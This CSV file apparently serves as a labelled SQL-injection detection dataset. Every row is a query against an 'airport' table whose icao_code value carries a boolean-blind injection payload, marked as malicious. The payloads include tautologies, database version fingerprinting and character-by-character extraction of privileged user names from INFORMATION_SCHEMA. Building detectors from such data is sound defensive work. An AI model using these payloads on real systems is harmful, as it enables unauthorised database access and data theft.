full_query,label,template_id,malicious_input,malicious_input_desc
SELECT * FROM airport WHERE icao_code = '-1292) AS QFyT WHERE 3666=3666 OR 8760=3204-- VvzO';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-2326) AS DZAC WHERE 9481=9481 OR 2994=2994-- iwLd';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT') OR NOT 8188=6397-- NIWG';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT') OR NOT 6803=6803-- QYIz';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 4439=8252-- uyEG';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 6803=6803-- kPsa';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 2466=3550-- KrXS';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 34=34-- ebzh';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 34=64-- NDCZ';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 64=54-- mMcE';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 54=54-- DTRK';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 64 54-- tTaX';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 54=54-- AaEB';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 54=98-- cjvm';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 98=59-- sNxQ';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 59=59-- yZBU';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 98 59-- kXLz';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 30=30-- PlvJ';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 30=83-- QujC';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 83=36-- ECzC';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 36=36-- UkOl';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 83 36-- tehm';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 16=16-- VRir';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 16=67-- wqET';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 67=19-- QbjK';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 19=19-- DYUB';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 67 19-- lECy';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 21=21-- sCsf';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 21=82-- fBgn';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 82=39-- lLkJ';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 39=39-- yLys';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 82 39-- RRGw';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 2776=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                2776-- JQyP';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT (5852)=5852-- Ejdz';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT 5853>5852-- FUYR';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT QUARTER(NULL XOR NULL) IS NULL-- Fwnm';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT SESSION_USER() LIKE USER()-- VLxU';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ISNULL(JSON_STORAGE_FREE(NULL))-- kOLB';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT VERSION() LIKE 0x254d61726961444225-- hacl';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT VERSION() LIKE 0x255469444225-- VUaf';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT @@VERSION_COMMENT LIKE 0x256472697a7a6c6525-- JFJB';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT @@VERSION_COMMENT LIKE 0x25506572636f6e6125-- AEna';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT AURORA_VERSION() LIKE 0x25-- cScO';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),1,1))>51-- nCRF';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),1,1))>54-- nCRF';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),1,1))>52-- nCRF';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),1,1))>53-- nCRF';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),2,1))>51-- nCRF';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),2,1))>48-- nCRF';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),2,1))>9-- nCRF';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>51-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>48-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>49-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>50-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>51-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>48-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>9-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>47-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>51-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>48-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>9-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>64-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>64-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>64-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>64-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>32-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>120-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>120-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>48-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>124-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>104-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>108-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>116-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>40-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>110-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>122-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>114-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>115-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>36-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>109-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>38-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>39-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>121-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>120-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>104-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>48-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>116-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>108-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>104-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>108-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>114-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>24-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>106-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>36-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>107-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>113-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>106-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>42-- SWoZ';",1,airport-S1,Unknown,Unknown
